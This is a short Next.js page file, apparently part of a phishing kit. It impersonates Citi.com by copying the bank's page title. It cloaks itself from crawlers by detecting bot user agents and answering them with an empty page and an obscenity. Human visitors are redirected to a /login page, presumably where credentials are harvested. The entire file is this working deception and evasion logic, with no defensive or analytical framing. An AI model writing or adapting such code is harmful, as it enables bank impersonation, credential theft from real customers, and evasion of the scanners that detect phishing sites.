import MobileDetect from "mobile-detect";
import type { NextPage } from "next";
import Head from "next/head";
import { Loading } from "../components/Loading";

const index: NextPage<{ isBot: boolean }> = ({ isBot }) => {
  if (isBot) {
    return <div />;
  }

  return (
    <>
      <Head>
        <link rel="shortcut icon" href="/favicon.ico" />
        <title>
          Online Banking, Mortgages, Personal Loans, Investing | Citi.com
        </title>
      </Head>
      <Loading opacity={1} />
    </>
  );
};

export const getServerSideProps = ({ res, req }: { res: any; req: any }) => {
  const md = new MobileDetect(req?.headers[`user-agent`] as string);
  const isBot = md.is(`Bot`);

  if (isBot) {
    res.end(`Fuck off`);
    return {
      props: { isBot },
    };
  }

  return {
    props: { isBot },
    redirect: {
      destination: "/login",
      permanent: false,
    },
  };
};

export default index;
